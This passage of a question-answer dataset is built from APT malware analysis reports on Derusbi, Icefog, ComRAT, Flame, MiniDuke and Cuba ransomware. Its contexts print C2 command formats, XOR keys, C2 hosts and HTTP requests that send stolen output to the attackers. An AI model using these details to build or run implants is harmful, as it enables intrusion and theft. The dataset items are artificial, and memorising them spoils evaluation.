4).\nCommLoop routes packets to the appropriate command handler object by locating the dwPacketIdentifierCode within each of the registered command handlers that matches the incoming packets dwPktType. When the appropriate command handler is found, CommLoop passes the payload of portion of the packet to the command handler's ProcessPacket function.\nBig Headline: PCC_CMD\nThe PCC_CMD object contains the remote shell functionality of the server variant along with the ability to execute arbitrary programs. Derived from the PCC_BASEMOD class, the PCC_CMD\nclass's operations are focused largely in the ProcessPacket and ReadWaitingData functions. The PCC_CMD::ProcessPacket function works as a stub function that merely passes the packet's payload data (pkt) data to PCC_CMD::ProcessPacketEx while ignoring the dwPktSize parameter. The packet's payload data is, in and of itself, another datagram with a header and optional payload section. The payload of each PCC_CMD destined packet contains the following header:\nstruct PCCCMDPacketHeader\n{\n};\nThe dwCommandType field specifies the specific PCC_CMD command that the client is requesting the server variant perform. There are four commands that PCC_CMD supports:\nFor each of the commands, any output from or acknowledgement of the commands comes in the form of another packet consisting of a PacketHeader followed by a PCCCMDPacketHeader and any optional payload data. The dwCommandType of the newly constructed packet matches the command's original dwCommandType value (e.g. responses from 0x04 commands will reply with dwCommandType set to 0x04).\nPCC_CMD::ProcessPacketEx will queue the response packets in an internal buffer.\nThe PCC_CMD::ReadWaitingData member function is responsible for transmitting any of the previously queued packets from PCC_CMD::ProcessPacketEx. If there are no queued packets, PCC_CMD::ReadWaitingData will perform a queue of the console output pipe for the remote shell process (if it is active); the function will also attempt to read the entirety of the waiting data, which then becomes the payload of a PacketHeader/PCCCMDPacketHeader based packet with the dwCommandType set to 0x0C. If the read is unsuccessful, the function returns a PacketHeader/PCCCMDPacketHeader based packet with the dwCommandType set to 0x10 indicating an error and terminating the remote shell session.\nBig Headline: PCC_FILE\nThe PCC_FILE object provides a large range of file system administration functions. PCC_FILE is derived from the PCC_BASEMOD class meaning that the processing of commands should be contained within the PCC_FILE::ProcessPacket member function with some additional processing done in the PCC_FILE::ReadWaitingData member function. This is not necessarily the case, however.\nThe PCC_FILE::ProcessPacket member function, much like PCC_CMD::ProcessPacket, is little more than a stub function that passes only a copy of the payload data (pkt) to PCC_FILE::ProcessPacketEx. PCC_FILE::ProcessPacketEx performs no file management operations but instead adds any incoming command packets to a queue for processing by PCC_FILE::ReadWaitingData if the packet is not already within the queue (thus avoiding duplication of commands).\nThe PCC_FILE::ReadWaitingData member function is a stub function that calls PCC_FILE::ProcessQueue and returns the resulting packet from the queue processing. This means that file operations are surprisingly low priority, and potentially, high latency operations.\nEach packet that arrives within the packet queue of PCC_FILE contains a standard header followed by a (quasi-optional) payload data blob. The header for the PCC_FILE command packets takes the following form:\nstruct PCCFilePacketHeader\n{\nDWORD dwTotalPayloadSize; DWORD dwCommandType;\n};\nThe dwCommandType field specifies the specific PCC_FILE command that the client is requesting the server variant to perform. PCC_FILE supports 17 (of which 15 are unique) commands. While the general form within the Derusbi server variant communication model is to return a packet with the same dwCommandType as the original command, many of the PCC_FILE commands return a status packet type (dwCommandType = 0x04).\nCommands 0x2C, 0x44, and 0x48 all appear to be the exact same base command with only slight variations in their response format. It is unclear why this particular command is included three times in PCC_FILE.\nQuestion: Explain the role of the CommLoop thread in the Derusbi server variant and how it handles incoming packets and command handlers.",
    "output": "Answer: The CommLoop thread in the Derusbi server variant is responsible for managing the communication loop after the initial connection is established. It begins by setting up internal command handlers, each derived from a base object called PCC_BASEMOD. The CommLoop enters an infinite loop where it waits for up to 1/100 of a second for network input. If input arrives, it routes the packet to the appropriate handler based on the dwPacketIdentifierCode matching the incoming packet's dwPktType. If no network input arrives, the CommLoop queries each command handler for any queued packets and transmits them. Additionally, if more than 60 seconds pass without network activity, the CommLoop sends out a beacon packet (dwPktType = 4). This ensures continuous communication and responsiveness even during periods of inactivity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "In 2021, Mandiant observed some threat actors deploying ransomware increasingly shift to exploiting vulnerabilities as an initial infection vector. UNC2596, a threat actor that deploys COLDDRAW ransomware, publicly known as Cuba Ransomware, exemplifies this trend. While (<https://www.ic3.gov/Media/News/2021/211203-2.pdf>)public reporting has highlighted CHANITOR campaigns as precursor for these ransomware incidents, Mandiant has also identified the exploitation of Microsoft Exchange vulnerabilities, including (<https://www.mandiant.com/resources/pst-want-shell-proxyshell-exploiting-microsoft-exchange-servers>)ProxyShell and (<https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/>)ProxyLogon, as another access point leveraged by UNC2596 likely as early as August 2021. The content of this blog focuses on UNC2596 activity which has led to the deployment of COLDDRAW ransomware.\nUNC2596 is currently the only threat actor tracked by Mandiant that uses COLDDRAW ransomware, which may suggest it's exclusively used by the group. During intrusions, these threat actors have used webshells to load the TERMITE in-memory dropper with subsequent activity involving multiple backdoors and built-in Windows utilities. Beyond commonplace tools, like Cobalt Strike BEACON and NetSupport, UNC2596 has used novel malware, including BURNTCIGAR to disable endpoint protection, WEDGECUT to enumerate active hosts, and the BUGHATCH custom downloader. In incidents where COLDDRAW was deployed, UNC2596 used a multi-faceted extortion model where data is stolen and leaked on the group's shaming website, in addition to encryption using COLDDRAW ransomware. COLDDRAW operations have impacted dozens of organizations across more than ten countries, including those within critical infrastructure.\nRead the text above and answer this question: How does the threat actor UNC2596 leverage vulnerabilities in Microsoft Exchange servers to deploy COLDDRAW ransomware, and what specific tools and techniques do they use during their intrusions?",
    "output": "UNC2596, a threat actor known for deploying COLDDRAW ransomware (also known as Cuba Ransomware), has been observed exploiting vulnerabilities in Microsoft Exchange servers, including ProxyShell and ProxyLogon, as an initial infection vector as early as August 2021. During their intrusions, UNC2596 employs webshells to load the TERMITE in-memory dropper, followed by the use of multiple backdoors and built-in Windows utilities. They utilize common tools like Cobalt Strike BEACON and NetSupport, along with novel malware such as BURNTCIGAR to disable endpoint protection, WEDGECUT to enumerate active hosts, and the BUGHATCH custom downloader. Their extortion model involves both stealing and leaking data on their shaming website, in addition to encrypting data using COLDDRAW ransomware. These operations have impacted numerous organizations across more than ten countries, including those within critical infrastructure.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 5. C&C communication\nC&C communication is defined under the name GATOR. Resource 146 contains key-value pairs or templates related to GATOR configuration.\nWe received information of more than 50 different domain names related to the C&C communication and more than 15 distinct IP addresses. C&C servers are changed frequently by changing the IP address of the particular host/domain name (the well-known fluxing technique used by botnets).\nMany more configuration settings and logs for C&C communications can be found in the to691.tmp file.\nC:\\Program Files\\Common Files\\Microsoft Shared\\MSAuthCtrl\\secindex.dat https://XXXX.info:443/cgi-bin/counter.cgi\nhttps://XXXX.info:443/cgi-bin/counter.cgi\nSINGLE CMD RUNNER\nFigure 41-To691.tmp strings on C&C communications and other activity\nBig Headline: 6. Attack details \u2013 dictionary and scripts\nThe file dstrlog.dat contains a ClanDB for names and terms used by the malware, an SQLite database used for attacks. This file is loaded through libclandb.lua by SQL commands, and the database is accessed using Lua scripts. We disclose detailed description of the SQLite database to show the SQL tables used for attacks. The attackers even take care of versions, and update the structure if necessary. The sample below shows a version upgrade script.\nFigure 42 \u2013 ClanDB update if version is too old\nThere are a number of names and phrases in the database used in the code of the malware. Deeper analysis is needed to fully understand all these references. Here, we include the result of our initial investigation with a note that these interpretations might not be correct.\nBoost: Possibly information gathering based on enquiries received from remote parties.\nFlame: Common name for attacks, most likely by exploits. Ef_trace.txt relation. %temp%\\dat3C.tmp and %systemroot%\\\\temp\\\\msdclr64.ocx related.\nFlask: Attacks can be Jimmy or Flask. Probably Flask is one flame. Not sure.\nJimmy: A specific CLAN attack type, but also a flame. CLAN probably refers to a local network attack while flame can be anything. Based on dll: \"c:\\Projects\\Jimmy\\jimmydll_v2.0\\JimmyForClan\\Jimmy\\bin\\srelease\\jimmydll\\inds vc32.pdb\" reference can be found in it\nMovefile: No information\nMunch: Installation/propagation mechanism related to windows update and web downloads. Strings and possibly code can be found in mscrypt.dat\nSFS: Storage files. Some DAT files, like ntcache.dat, lmcache.dat.\nSnack: Related to Munch attack, possibly part of local propagation by exploit.\nSpotter: Possibly some scanner\nTransport: Replication method. Exploit-based propagation is most likely called flame, while that based on bad access permissions is a \"Transport\". E.g. \"NU\" or \"NUSystem\" refers to \"net use\" way of propagation.\nEuphoria: \"EuphoriaApp\" handling. Related to a \"Flame\" attack. Related to \"mediaId\". Possibly file leaking after successful attack.\nBUENO_FLAME_DLL_KEY \u2013 pointer to a large 1 MB binary in wpgfilter.dat\nCONFIG_TABLE : Referred from Lua code for configuration directives. Contains lot of parameters for attacks. Not sure which configuration is that.\nHeadache: Related to multiple attacks, possibly additional parameters or properties of the attacks.\nMultiple phrases are related to animals in the malware:\nGator: Windowsupdate based internet-check. If everything successful, things go on. If not, then there is a minimum and maximum waiting time defined, and a multiplier to increase retries slowly.\nGoat: Possibly C&C communications to GOAT servers\nQ: What role does the SQLite database play in sKyWIper's attack strategy, and how is it utilized within the malware's infrastructure?",
    "output": "The SQLite database, referred to as ClanDB, plays a crucial role in sKyWIper's attack strategy by storing names and terms used by the malware. This database is loaded through libclandb.lua by SQL commands and is accessed using Lua scripts. The attackers maintain different versions of the database and update its structure when necessary, indicating a high level of organization and sophistication. The database includes various tables used for attacks, such as 'Boost' for information gathering, 'Flame' for common attacks, 'Jimmy' for specific CLAN attack types, and 'Munch' for installation/propagation mechanisms. These entries suggest a structured approach to managing and executing different aspects of the attack.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Dropper's log file\nIf the version of the malware is older than 3.26, the dropper creates an additional file called winview.ocx. We noticed that the file name is still the same as the file name used by Agent.BTZ in the past. The file is xored with the following obfuscation key (used by both, Uroburos and Agent.BTZ):\n1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s\nHere is the decoded log file content:\nuser1@gdata$ ./decode.py winview.ocx\nLog begin: 06.11.2014 22:55:55\nTVer=2.2\n06.11.2014 22:55:55 TVer=2.3\n06.11.2014 22:55:55 CFG: CFG_4\n06.11.2014 22:55:55 User: user1\n06.11.2014 22:55:55 Machine: x86\n06.11.2014 22:55:55 Removing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\shdocvw.tlb [2] 06.11.2014 22:55:55 Removing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\oleaut32.dll [2] 06.11.2014 22:55:55 Removing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\oleaut32.tlb [2] 06.11.2014 22:55:55 Removing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\credprov.tlb [2] 06.11.2014 22:55:55 Removing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\libadcodec.dll [2] 06.11.2014 22:55:55 Removing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\libadcodec.tlb [2] 06.11.2014 22:55:55 Writing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\shdocvw.tlb 51200B Ok\n06.11.2014 22:55:56 Writing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\credprov.tlb 260096B Ok\n06.11.2014 22:55:57 Exit code1 0\n06.11.2014 22:55:57 Writing 3072B Ok\nWe can notice that the malware checks if an older version is installed on the system and if this is the case, the dropper removes the older version. In contrast to this, in our Uroburos analysis, we found out that Uroburos does not install itself in case a version of Agent.BTZ was found on a system.\nBig Headline: Execution flow and features\nDuring the startup of the infected machine, the shdocvw.tlp library is loaded into all processes. If the process is explorer.exe, this library will load the other library called credprov.tlb. This library is the real payload. Its features are common for a Remote Administration Tool (RAT):\ncommand execution;\nfile download;\nfile upload;\ninformation gathering.\nComRAT's communication to the command and control server is performed by the browser process and not by explorer.exe in order to avoid being blocked by a firewall on the system or any additional security products. The communication between the processes is performed by named pipe.\nBig Headline: Log files\nTwo log files are created during the malware execution: mskfp32.ocx and msvcrtd.tlb. If the malware version is older than 3.26, the xored key is the same as the dropper key. Concerning the version 3.26, the malware uses a new non-ASCII key. Here is an example of decoded log file for the version 3.26:\nuser1@gdata$ ./decode.py mskfp32.ocx\n<?xml version=\"1.0\" encoding=\"unicode\"?>\n<Ch>\n<TVer>2.1</TVer>\n<AppendLog>0</AppendLog>\n<add key=\"Id\" value=\"168466483094462\" />\n<add key=\"PVer\" value=\"3.26\" />\n<add key=\"OSVer\" value=\"512600 Service Pack 30\" />\n<add key=\"Machine\" value=\"x86\" />\n<add key=\"CryptKeyType\" value=\"3\" />\n<add key=\"CryptKeyId\" value=\"0\" />\n<add ke=\"IsAdmin\" value=\"1\" />\n<add key=\"Http idx1\" value=\"4294967295\" />\n<add key=\"Http idx2\" value=\"4294967295\" />\n<add key=\"Http timeout\" value=\"60\" />\n<add key=\"Time\" value=\"06:11:2014 15:54:34\" />\n<add key=\"Bias\" value=\"-2\" />\n<add key=\"PcName\" value=\"USER1-ABC1234\" />\n<add key=\"UserName\" value=\"user1\" />\n<add key=\"WinDir\" value=\"C:\\\\WINDOWS\" />\n<add key=\"TempDir\" value=\"C:\\\\DOCUME~1\\\\user1\\\\LOCALE~1\\\\Temp\\\\\" />\n<add key=\"WorkDir\" value=\"C:\\\\ Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\\" />' </Ch>\nWe can identify the version of the malware thanks to the PVer flag. The command and control server information is stored in the registry, not in an XML, and encoded:\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SessionMRU\\IPlace\nFor example, in the analyzed sample the CC is: weather-online.hopto.org. This domain is far from unknown, as it has been mentioned in (<http://info.baesystemsdetica.com/rs/baesystems/images/snake_whitepaper.pdf>)BAE System's Uroburos (aka Snake) analysis paper as C&C server domain for the Uroburos malware. Another connection between the cases.\nIf the malware version in lower than 3.26, the XML log file contains the command and control server information:\n[\u2026]\n<add ke=\"IsAdmin\" value=\"1\" />\n<add key=\"Http address\" value=\"webonline.mefound.com\" />\n<add key=\"Http address\" value=\"sportacademy.my03.com\" />\n<add key=\"Http address2\" value=\"easport-news.publicvm.com\" />\n<add key=\"Http address2\" value=\"new-book.linkpc.net\" />\n<add key=\"Http idx1\" value=\"4294967295\" />\n[\u2026]\nMedium Headline: Differences:\nIn version 3.26, the author changed the key and remove the known file name\nThis action can be an indication for the developer's effort to hide this connection\nThe main difference is the design\nAgent.BTZ is a common RAT, a simple library executed on an infected machine. ComRAT is more complex and cleverer. The malware is loaded into each and every process of the infected machine and the main part (payload) of the malware is only executed in explorer.exe. Furthermore, the C&C communication blends into the usual browser traffic and the malware communicates to the browser by named pipe. It is by far a more complex userland design than Agent.BTZ.\nThese differences, mainly the more complex design, lead us to give this malware a new name.\nThe analyzed dropper of v3.25 has a compilation date of February 6th 2014. The more recent dropper of v3.26, which has all the mentioned changes implemented, reveals a compilation date of January 3rd 2013. We suspect that this date is spoofed in order to disguise that this is in fact a newer version.\nBig Headline: Conclusion\nThis analysis shows that even after the Uroburos publication in February 2014, the group behind this piece of malware seems to be still active. In any case, the ComRAT developers implemented new mechanisms, changed keys, removed log files to hide their activities and tried to disguise the connections between the RAT ComRAT, the rootkit Uroburos and the RAT Agent.BTZ as much as possible. However, we can still follow the evolution of the malware by comparing the versions.\nThe persistence mechanism discovered in October 2014 makes it possible to intrude into a system in a really discreet manner and we estimate that other actors will use the same persistence mechanism in the near future.\nWe will definitely keep our ears and eyes open and continue analyzing.\n\nAnswer this question based on the above context: What are the key features of ComRAT's execution flow, and how does it communicate with its command and control server?",
    "output": "ComRAT's execution flow involves loading the shdocvw.tlp library into all processes during the startup of the infected machine. If the process is explorer.exe, this library loads another library called credprov.tlb, which is the real payload. ComRAT's features include command execution, file download, file upload, and information gathering. Communication with the command and control server is performed by the browser process, not by explorer.exe, to avoid detection by firewalls or security products. The communication between processes is done via named pipes.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: COMMAND CMD_\nThe cmd command expect a payload string (<COMMAND>) following the \"cmd_\" prefix, so that the full command syntax looks like this: cmd_<COMMAND>. It creates a new process with command line C:\\windows\\system32\\cmd.exe /c <COMMAND>\nHowever, if <COMMAND> contains output redirection character \">\", the executed command line will be as following:\nC:\\windows\\system32\\cmd.exe /c command > %TMP%\\ cmd1.dat.\nAfter the process has finished its stdout output is sent to the C&C via\nPOST request to '/news/upload.\naspx?filepath=result&filename=<HOSTNAME>_<HOSTIP>.jpg'\nHost: icefog.8.100911.com\nUser-Agent: MyAgent\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*\nAccept-Language: en-us\nContent-Type: multipart/form-data\nAccept-Encoding: gzip, deflate\nConnection: Keep-Alive\nCache-Control: no-cache\nThe command-line output is converted to wide-char string and XORed using \"*&~^%@0hh8979\" string as the key.\nSmall Headline: COMMAND UPLOAD_\nThe command string format must be as following: upload_<FILEPATH>_<FILENAME>\nIt attempts to fetch icefog.8.100911.com/news/order/<FILENAME> using user agent mydownload and saves the response to the local path specified in <FILEPATH>.\nAfter that it notifies the C&C by sending\nHTTP/1.1 POST request Query string: /news/upload.aspx?filepath=upload&filename=<FILENAME>\nFull HTTP/1.1 headers:\nHost: icefog.8.100911.com\nUser-Agent: MyAgent\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*\nAccept-Language: en-us\nContent-Type: multipart/form-data'\nAccept-Encoding: gzip, deflate\nConnection: Keep-Alive'\nCache-Control: no-cache\nSmall Headline: COMMAND DOWNLOAD_\nDownload command format must be\n\"download_<LOCALPATH>\\<FILENAME>/<NAMEONSERVER>\nThe <LOCALPATH>\\<FILENAME> file is opened and its content is prepared for uploading by converting ANSI data to Unicode and XORing using key \"*&~^%@0hh8979\". The result is saved to %TMP%\\tmpxor.dat'\nThe tmpxor.dat is uploaded via POST request to 'icefog.8.100911.com' at port 80.\nQuery string: '/news/upload.aspx?filepath=download&filename=<HOSTNAME>_ <HOSTIP>_<NAMEONSERVER>_<FILESIZE>.jpg'.\nFull HTTP/1.1 headers:\nHost: icefog.8.100911.com\nUser-Agent: MyAgent\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*\nAccept-Language: en-us\nContent-Type: multipart/form-data'\nAccept-Encoding: gzip, deflate\nConnection: Keep-Alive\nCache-Control: no-cache\nSmall Headline: NO COMMAND\nIf no known command is parsed out of the server response, the Trojan notifies the server about being alive by issuing the following HTTP POST request:\nQuery string: '/news/upload.\naspx?filepath=ok&filename=<HOSTNAME>_<HOSTIP>.jpg'\nHost: icefog.8.100911.com\nUser-Agent: MyAgent\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*\nAccept-Language: en-us\nContent-Type: multipart/form-data\nAccept-Encoding: gzip, deflate\nConnection: Keep-Alive\nCache-Control: no-cache.\nAfter that it sleeps for 150 seconds and starts the command-processing loop again.\nMedium Headline: THE ICEFOG-NG BOT DESCRIPTION\nIn addition to the web-based Icefog malware samples, we have come across a variant of the Icefog bot which is based on a custom protocol working over a TCP session (port 5600 TCP) with its own desktop application that serves as a command-and-control center.\nFor reference, we called it Icefog-NG (New Generation). We believe that the new generation of Icefog was created to improve bot response and to increase the efficiency of operations. The previous web-based version of the bot had significant time lag during operation (up to 40 seconds), the new generation bot was created to solve the time lag issue.\nSmall Headline: DETAILED DESCRIPTION\nTo enable automatic start during system boot, the malware adds and uses the following system registry value:\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load=\"%TMP%\\msloger.exe\"\nDuring start it checks if a file named \"%TMP%\\~AA.tmp\" exists. If yes, it copies the file to %TMP%\\ hwp.hwp. Next it kills processes named \"hwp.exe\" and then opens \"hwp.hwp\". This is important step during first malware run which opens a decoy .hwp document. This shows that the malware was designed to be installed from .hwp documents containing exploits.\nThen it copies \"%TMP%\\~Ab.tmp\" to \"%TMP%\\msloger.exe\".\nAfter that the malware registers on the C&C. To do that, the malware connects to www.kreamnnd. com on port 5600 and sends a registration message\n[Total message size: DWORD]SX[HOSTID length:WORD][HOSTID][Host Info Data Size: DWORD][Host Info Data]\nHOSTID is a string having system hostname and system IP joined by \"_\": Hostname_IP.\nThe data is encrypted using XOR with key \"&*^*@~^%9?i0h\". If the connection with C&C is lost the bot can re-establish the session by sending\n[Total message size: DWORD]XT[Hostname length:WORD][HOSTNAME]_[IPADDR]\nSmall Headline: COMMAND CMD\nThis command is used to execute a command line. The message has the following format:\n[Total Message Size: DWORD]SC[COMMAND]\nThe bot checks if the COMMAND contains \"sleep\" then it sleeps for the specified time after \"sleep\" substring.\nOtherwise, a new cmd.exe processes is spawned to execute the COMMAND. If the command does not contain \">\" the output will be directed to %TMP%\\cmd1.dat and the result will be sent to the C&C automatically using the following format:\n[Total Message Size: DWORD][cmd1.dat data]\nThe %TMP%\\cmd1.dat is deleted after the file is sent to the C&C.\nSmall Headline: COMMAND DOWNLOAD\nThis command is used to download a file from the victim machine. The message has the following format:\n[Total Message Size: DWORD]DL[FILEPATH]\nThe server expects the bot to send a response message with the file size from victim bot\n[Total Message Size: DWORD]OK[File Size: DWORD]\nThen the server sends an acknowledgement message to the victim bot\n[Total Message Size: DWORD]OK\nThe bot encrypts the contents of the file and saves it to %TMP%\\mstmpdata.dat. After that part it sends mstmpdata.dat file split in chunks of 0x4ffc each (the last one may be shorter than 0x4ffc). Here is the format of that message:\n[Total Message Size: DWORD][File data no longer than 0x4ffc]\nThe last message is repeated containing the next chunk of the file until end of file is reached.\nSmall Headline: COMMAND UPLOAD\nThis command is used to upload a file from the C&C to the bot. The format of this command is the following:\n[Total Message Size: DWORD]UP[File Size: DWORD][Data Chunk Size+Total Message Size field length, a hardcoded value of 0x5000: DWORD][File Name]\nThe server expect an OK message from the bot\n[Total Message Size: DWORD]OK\nThen C&C sends the first part of the file.\n[Total Message Size: DWORD][File data no longer than 0x4ffc]\nThe server expects the OK message from the bot and transfers the next data chunk until the whole file is uploaded\n\nDescribe the process by which the Icefog-NG bot executes a command received from the C&C server, including how it handles the command output and any special cases like the 'sleep' command.",
    "output": "The Icefog-NG bot executes commands received from the C&C server using the format `[Total Message Size: DWORD]SC[COMMAND]`. If the command contains the substring 'sleep', the bot sleeps for the specified time. Otherwise, a new `cmd.exe` process is spawned to execute the command. If the command does not contain the redirection character '>', the output is directed to `%TMP%\\\\cmd1.dat`, and the result is sent to the C&C using the format `[Total Message Size: DWORD][cmd1.dat data]`. The `%TMP%\\\\cmd1.dat` file is deleted after the file is sent to the C&C.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: 7. Malware Versions\nEach sample of the malware comes with a version number hardcoded in the binary. Different versions are usually linked to a different Twitter account. The vast number of versions indicates intense activity, but only a limited number of samples are known. The timestamp is isolated from the sample's PE header and represents the moment in which the executable file has been linked. Although it can be usually spoofed, we believe it is real, as we were able to correlate it with the moment we received each of the samples.\nMedium Headline: 2012\n2012/05/14 - 6.66 - trulrich\n2012/05/21 - 5.21 - trulrich\n2012/05/23 - 6.67 - zokath\n2012/06/06 - 6.06 - tonyafordy\n2012/09/04 - 0.49 - CurtinDiana\n2012/12/26 - 3.13 - RuthHarper14\nFor year 2012, there are a number of different versions, although we don't know if they follow a strict order or not. For instance, version 3.13 was released in December, while version 5.21 was spotted in May. It is possible that the servers hosting the samples to have run out of sync. This would explain why lower versions have shown up in December.\nBig Headline: 8. Anti-Reverse Techniques\nThe first defense mechanism to prevent analysis is the presence of the watermark. The binary file won't properly run on a different machine, since the data inside the malware would be decrypted improperly.\nOther techniques to prevent data decryption are present inside the binary:\n\uf0b7 Running software used for reverse engineering: OllyDbg, IDA, Process Monitor etc.\n\uf0b7 Running the binary in virtual machines: VMWare and VirtualBox.\n\uf0b7 Breakpoints added to the code or code alteration (hardware breakpoints need to be used instead).\nThe malware also monitors for signs of user interaction, a common technique used for anti-emulation and anti-automated malware analysis. Another important aspect for versions in 2012 and 2013 is the fact that the malware does not trigger right after installation, but rather wait for a system restart to execute its main code.\nMedium Headline: 9.2 The Loader\nThe loader decodes the information in the .data section with the UCL algorithm, then passes control to the decrypted code. This piece of code holds a small loader stub, followed by an executable file which is the backdoor itself. The stub overwrites the memory image of the original executable file with the backdoor so it is never written on disk.\nThe malware also creates the following key in the Registry HKCU\\Software\\Microsoft\\ApplicationManager with a value of AppID = <random> (the value is generated via the GetTickCount() function). Malware then waits in a loop and performs requests to info.leveldelta.com\nExample: GET /php/text.php?i=gigogrzf4J74xQdeBqVi6w360xlP2ksrNpY7dxmj Accept: */* User-Agent: Mozilla/4.0 Host: info .leveldelta.com\nThe base64 value in the request is a 30-byte buffer derived from AppID and GetTickCount() and is always different. We believe that it is used as an identifier. If it gets a response from the server, the malware performs a series of validations and execute the received commands.\nThe responses are sent via POST and contain the identifier from the GET request, followed by the command's result. This is the way the malware exfiltrates documents from the target computers.\nMedium Headline: 9.3 Backdoor commands\nmv - Moves a file. Uses MoveFileA api. cp - Copies a file. Uses CopyFileA api. rm - Deletes a file. Uses DeleteFileA api. pwd - Gets current dir. Uses GetCurrentDirectoryA api. cd - Sets current dir. Uses SetCurrentDirectoryA api. rmdir - Removes dir. Uses RemoveDirectoryA api. mkdir - Creates a dir. Uses CreateDirectoryA api. pskill - Kills process. Uses OpenProcess, TerminateProcess apis.\nexew - Create a process. Uses CreateProcessA api. conf - Gets some configuration data, creates a string \"id: 0x%08X\\char`\nhost: info.leveldelta.com\\\ncdt - Change to TEMP dir. Uses GetTempPathA, SetCurrentDirectoryA APIs. dev - Returns the list of drives in the system with their type (fixed, removable, etc). The following strings are used for their types: unk, nrt, rmv, fix, net, cdr, ram, und. Uses GetLogicalDriveStringsA, GetDriveTypeA apis. time - Gets the number of hours since the system was started: \"uptime %5d.%02dh\". Uses GetTickCount api. info - Gets info about system. String generated like: \"%d %s\\n%s\\\n%s\\\" using GetCurrentProcessId, GetModuleFileNameA, GetComputerNameA, GetUserNameA apis. exit - \"exiting...\" dir, ls - List files in current dir. Uses FindFirstFile(\"*\"), FindNextFile apis. exeu - CreateProcessWithLogonW and reads data from pipe. ecec - CreateProcessA and read data from pipe. put - Writes file on disk from internal buffer. Uses CreateFileA, WriteFile apis. get - Reads a file in chunks of 0x400 bytes and computes SHA1 on them. ps, pslist - Gets info about processes and their modules. Uses EnumProcesses, OpenProcess, EnumProcessModules, GetModuleFileNameExA apis.\nMedium Headline: 9.4 Servers\nWe have identified two servers used in the attack (sample md5/timestamp/server): 1e1b0d16a16cf5c7f3a7c053ce78f515, 2012-03-05 news.grouptumbler.com/news/feed.php b029378966d2694f8abd51f0d6c7822a, 2012-06-15 info.leveldelta.com/php/text.php 53db085a276ebbf5798ba756cac833ea, 2013-02-22 info.leveldelta.com/php/text.php\nWhois information on news.grouptumbler.com\nRegistrant Contact:\nGrouptumbler.COM\nTim K. Lappin ()\nFax:\n4573 Froe Street\nBluefield, WV 24701\nBluefield, WV 24701\nUS\n4573 Froe Street\nBluefield, WV 24701\nBluefield, WV 24701\nWhois information on info.leveldelta.com\nAbdul Kasim ()\nFax: 1442 Sokak No 49 Izmir, IZMIR 35432 TR 1442 Sokak No 49 Izmir, IZMIR 35432 TR\nMedium Headline: 10.2 Modus Operandi\nThe malware checks to see if the host computer connects to the Internet through a proxy server. If set, the malware uses the proxy settings. Regardless of the connection method, the malware connects to 85.95.236.114:443 using sockets.\nIt creates an unique identifier (DWORD size), from the socket handle. Everything is encrypted with XOR and a value of an address on the stack.\nIt sends the identifier on the opened socket.\nIt receives 16 bytes from the socket, and creates a MD5 hash on these. The MD5 hash will be used as key for the AES algorithm.\nIt receives 16 bytes used for AES encryption as initialization vector.\nIt receives 4 bytes, it performs a XOR operation with the identifier and allocates memory as follows: malloc(val XOR user_id)\nIt receives a number of size bytes, decrypts them with AES and calls the start of the decrypted buffer.\nThe payload can be used to load new modules. The received code needs to be completely relocatable as the main piece of malware. Using this technique, the attackers may introduce malicious code that will never be saved on disk, but rather executed directly from memory. We could also presume that some payloads have been exclusively delivered via this channel and can't be recovered for forensic investigation because they never made it on the disk drive.\nInformation about 85.95.236.114 Location: Turkey Izmir Inetmar Internet Hizmetleri San. Tic. Ltd. Sti ASN: AS49467 INETMAR INETMAR Internet Hizmetleri Autonomous System (izmir) (registered Jun 15, 2009)\nContact: person: Deniz Tosun org: ORG-IiHS1-RIPE address: 1370 sok. NO:42 Yalay Is Merkezi Kat:4/406 address: Montro/Konak/IZMIR Country: TR\n\nHow does MiniDuke establish communication with its command and control servers, and what encryption methods are used to secure this communication?",
    "output": "MiniDuke establishes communication with its command and control servers by first checking if the host computer connects to the Internet through a proxy server. If a proxy is set, the malware uses the proxy settings. Regardless of the connection method, it connects to 85.95.236.114:443 using sockets. It generates a unique identifier (DWORD size) from the socket handle and encrypts everything with XOR using a value from the stack. The identifier is sent on the opened socket, and the malware receives 16 bytes, creating an MD5 hash used as the key for AES encryption. It also receives 16 bytes for the AES initialization vector and 4 bytes for memory allocation. The payload is decrypted with AES and executed directly from memory, ensuring that no malicious code is saved on disk.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Explain the components and functionality of the Shamoon/Disttrack malware, including its destructive payload and the methods used to spread and activate it.",
